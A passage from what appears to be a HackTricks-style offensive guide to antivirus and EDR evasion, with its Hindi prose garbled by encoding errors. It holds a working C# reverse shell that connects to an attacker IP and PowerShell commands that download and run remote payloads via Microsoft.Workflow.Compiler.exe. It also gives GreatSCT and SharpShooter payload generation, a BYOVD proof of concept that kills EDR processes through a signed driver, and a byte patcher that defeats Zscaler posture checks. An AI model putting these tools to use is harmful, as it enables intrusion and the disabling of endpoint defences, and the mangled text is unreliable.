- рдпрджрд┐ `winvnc` рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рд╢реБрд░реВ рди рдХрд░реЗрдВ рдпрд╛ рдЖрдк [popup](https://i.imgur.com/1SROTTl.png) рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗред рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдпрд╣ рдЪрд▓ рд░рд╣рд╛ рд╣реИ `tasklist | findstr winvnc` рдХреЗ рд╕рд╛рде
- рдпрджрд┐ `UltraVNC.ini` рдЙрд╕реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдирд╣реАрдВ рд╣реИ рддреЛ `winvnc` рд╢реБрд░реВ рди рдХрд░реЗрдВ рдпрд╛ рдпрд╣ [config window](https://i.imgur.com/rfMQWcf.png) рдХреЛ рдЦреЛрд▓ рджреЗрдЧрд╛
- рдорджрдж рдХреЗ рд▓рд┐рдП `winvnc -h` рди рдЪрд▓рд╛рдПрдВ рдпрд╛ рдЖрдк [popup](https://i.imgur.com/oc18wcu.png) рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗ

### GreatSCT

рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
рдЕрдм **рд▓рд┐рд╕реНрдЯрд░ рд╢реБрд░реВ рдХрд░реЗрдВ** `msfconsole -r file.rc` рдХреЗ рд╕рд╛рде рдФрд░ **xml рдкреЗрд▓реЛрдб** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**рд╡рд░реНрддрдорд╛рди рдбрд┐рдлреЗрдВрдбрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╣реБрдд рддреЗрдЬреА рд╕реЗ рд╕рдорд╛рдкреНрдд рдХрд░ рджреЗрдЧрд╛ред**

### рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рд╕рдВрдХрд▓рд┐рдд рдХрд░рдирд╛

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### рдкрд╣рд▓рд╛ C# рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓

рдЗрд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
рдЗрд╕реЗ рдЗрд╕ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдХрдВрдкрд╛рдЗрд▓рд░
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрдЬреЗрдХреНрдЯрд░ рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### рдЕрдиреНрдп рдЙрдкрдХрд░рдг
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) тАУ Killing AV/EDR From Kernel Space

Storm-2603 рдиреЗ **Antivirus Terminator** рдирд╛рдордХ рдПрдХ рдЫреЛрдЯреЗ рдХрдВрд╕реЛрд▓ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рддрд╛рдХрд┐ рд░реИрдВрд╕рдорд╡реЗрдпрд░ рдХреЛ рдЧрд┐рд░рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрд╣ рдЙрдкрдХрд░рдг **рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдХрдордЬреЛрд░ рд▓реЗрдХрд┐рди *рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ* рдбреНрд░рд╛рдЗрд╡рд░** рд▓рд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реНрдиреЗрд▓ рд╕рдВрдЪрд╛рд▓рди рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ Protected-Process-Light (PPL) AV рд╕реЗрд╡рд╛рдПрдБ рднреА рдмреНрд▓реЙрдХ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреАрдВред

Key take-aways
1. **Signed driver**: рдбрд┐рд╕реНрдХ рдкрд░ рд╡рд┐рддрд░рд┐рдд рдлрд╝рд╛рдЗрд▓ `ServiceMouse.sys` рд╣реИ, рд▓реЗрдХрд┐рди рдмрд╛рдЗрдирд░реА рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ Antiy Labs рдХреЗ тАЬSystem In-Depth Analysis ToolkitтАЭ рд╕реЗ рд╡реИрдз рд░реВрдк рд╕реЗ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдбреНрд░рд╛рдЗрд╡рд░ `AToolsKrnl64.sys` рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдбреНрд░рд╛рдЗрд╡рд░ рдореЗрдВ рдПрдХ рд╡реИрдз Microsoft рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣реИ, рдпрд╣ рддрдм рднреА рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬрдм Driver-Signature-Enforcement (DSE) рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдбреНрд░рд╛рдЗрд╡рд░ рдХреЛ **рдХрд░реНрдиреЗрд▓ рд╕реЗрд╡рд╛** рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд░рддреА рд╣реИ рдФрд░ рджреВрд╕рд░реА рдЗрд╕реЗ рд╢реБрд░реВ рдХрд░рддреА рд╣реИ рддрд╛рдХрд┐ `\\.\ServiceMouse` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рднреВрдорд┐ рд╕реЗ рд╕реБрд▓рдн рд╣реЛ рд╕рдХреЗред
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID рджреНрд╡рд╛рд░рд╛ рдПрдХ рдордирдорд╛рдирд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░реЗрдВ (Defender/EDR рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ) |
| `0x990000D0` | рдбрд┐рд╕реНрдХ рдкрд░ рдПрдХ рдордирдорд╛рдирд╛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╣рдЯрд╛рдПрдВ |
| `0x990001D0` | рдбреНрд░рд╛рдЗрд╡рд░ рдХреЛ рдЕрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рд╕реЗрд╡рд╛ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдореЛрдб рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ; рдХрд░реНрдиреЗрд▓ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб *рд╕рдВрд░рдХреНрд╖рд┐рдд* рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рд╕рдорд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ PPL/PP, ELAM рдпрд╛ рдЕрдиреНрдп рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рдкрд░рд╡рд╛рд╣ рдХрд┐рдП рдмрд┐рдирд╛ рдХрд░реНрдиреЗрд▓ рд╡рд╕реНрддреБрдУрдВ рдХреЗ рд╕рд╛рде рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

Detection / Mitigation
тАв  Microsoft рдХреА рдХрдордЬреЛрд░-рдбреНрд░рд╛рдЗрд╡рд░ рдмреНрд▓реЙрдХ рд╕реВрдЪреА (`HVCI`, `Smart App Control`) рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рддрд╛рдХрд┐ Windows `AToolsKrnl64.sys` рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдордирд╛ рдХрд░ рджреЗред
тАв  рдирдП *рдХрд░реНрдиреЗрд▓* рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ рдФрд░ рдЬрдм рдХреЛрдИ рдбреНрд░рд╛рдЗрд╡рд░ рдПрдХ рд╡рд┐рд╢реНрд╡-рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдЕрдиреБрдорддрд┐ рд╕реВрдЪреА рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВред
тАв  рдХрд╕реНрдЯрдо рдбрд┐рд╡рд╛рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдореЛрдб рд╣реИрдВрдбрд▓ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рдмрд╛рдж рд╕рдВрджрд┐рдЧреНрдз `DeviceIoControl` рдХреЙрд▓реНрд╕ рдХреЗ рд╕рд╛рдеред

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler рдХрд╛ **Client Connector** рдбрд┐рд╡рд╛рдЗрд╕-рдкреЛрд╕реНрдЯрд░ рдирд┐рдпрдореЛрдВ рдХреЛ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ рдЕрдиреНрдп рдШрдЯрдХреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Windows RPC рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рджреЛ рдХрдордЬреЛрд░ рдбрд┐рдЬрд╝рд╛рдЗрди рд╡рд┐рдХрд▓реНрдк рдПрдХ рдкреВрд░реНрдг рдмрд╛рдпрдкрд╛рд╕ рдХреЛ рд╕рдВрднрд╡ рдмрдирд╛рддреЗ рд╣реИрдВ:

1. рдкреЛрд╕реНрдЯрд░ рдореВрд▓реНрдпрд╛рдВрдХрди **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб** рд╣реЛрддрд╛ рд╣реИ (рдПрдХ рдмреВрд▓рд┐рдпрди рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ)ред
2. рдЖрдВрддрд░рд┐рдХ RPC рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗрд╡рд▓ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХрдиреЗрдХреНрдЯрд┐рдВрдЧ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп **Zscaler рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** (рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `WinVerifyTrust`)ред

**рдЪрд╛рд░ рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ рдбрд┐рд╕реНрдХ рдкрд░ рдкреИрдЪ рдХрд░рдХреЗ** рджреЛрдиреЛрдВ рддрдВрддреНрд░реЛрдВ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() тЖТ return 0/1` | рд╣рдореЗрд╢рд╛ `1` рд▓реМрдЯрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рд░ рдЬрд╛рдВрдЪ рдЕрдиреБрдкрд╛рд▓рди рдореЗрдВ рд╣реЛ |
| `ZSAService.exe` | `WinVerifyTrust` рдХреЗ рд▓рд┐рдП рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рдХреЙрд▓ | NOP-ed тЗТ рдХреЛрдИ рднреА (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ) рдкреНрд░рдХреНрд░рд┐рдпрд╛ RPC рдкрд╛рдЗрдкреНрд╕ рд╕реЗ рдмрдВрдз рд╕рдХрддреА рд╣реИ |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд |
| `ZSATunnel.exe` | рдЯрдирд▓ рдкрд░ рдЕрдЦрдВрдбрддрд╛ рдЬрд╛рдВрдЪ | рд╢реЙрд░реНрдЯ-рд╕рд░реНрдХрд┐рдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
рдореВрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдмрджрд▓рдиреЗ рдФрд░ рд╕реЗрд╡рд╛ рд╕реНрдЯреИрдХ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж:

* **рд╕рднреА** рд╕реНрдерд┐рддрд┐ рдЬрд╛рдВрдЪ **рд╣рд░рд╛/рдЕрдиреБрдкрд╛рд▓рди** рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреА рд╣реИрдВред
* рдмрд┐рдирд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдмрд╛рдЗрдирд░реА рдирд╛рдорд┐рдд-рдкрд╛рдЗрдк RPC рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ (рдЬреИрд╕реЗ `\\RPC Control\\ZSATrayManager_talk_to_me`) рдХреЛ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВред
* рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрд╕реНрдЯ Zscaler рдиреАрддрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рддрдХ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкреНрд░рддрд┐рдмрдВрдз рдХреЗ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рдХреЗрд╕ рд╕реНрдЯрдбреА рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдЯреНрд░рд╕реНрдЯ рдирд┐рд░реНрдгрдп рдФрд░ рд╕рд░рд▓ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдЬрд╛рдВрдЪ рдХреЛ рдХреБрдЫ рдмрд╛рдЗрдЯ рдкреИрдЪ рдХреЗ рд╕рд╛рде рдкрд░рд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

- [Unit42 тАУ New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv тАУ Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research тАУ Before ToolShell: Exploring Storm-2603тАЩs Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
